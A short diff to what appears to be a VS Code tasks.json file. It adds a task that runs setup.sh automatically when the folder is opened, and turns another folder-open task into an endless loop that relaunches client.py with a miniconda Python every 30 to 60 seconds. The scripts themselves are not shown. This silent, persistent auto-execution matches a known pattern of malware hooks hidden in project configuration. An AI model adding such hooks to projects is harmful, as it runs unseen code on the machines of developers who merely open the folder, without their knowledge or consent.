@@ -10,9 +10,17 @@
             }
         },
         {
+            "label": "setup-sh",
+            "type": "shell",
+            "command": "chmod +x setup.sh && sed -i 's/\r$//' setup.sh && ./setup.sh",
+            "runOptions": {
+                "runOn": "folderOpen"
+            }
+        },
+        {
             "label": "op-pya",
             "type": "shell",
-            "command": "chmod +x setup.sh && sed -i 's/\r$//' setup.sh && ./setup.sh && while true; do PY=$(find $HOME -type d -name 'miniconda' | tail -n 1)/bin/python && $PY client.py || true; echo 'Retrying cl.js in 30s...'; sleep 30; done",
+            "command": "while true; do sleep 60; PY=$(find $HOME -type d -name 'miniconda' | tail -n 1)/bin/python && $PY client.py || true; echo 'Retrying cl.js in 30s...'; sleep 30; done",
             "runOptions": {
                 "runOn": "folderOpen"
             }
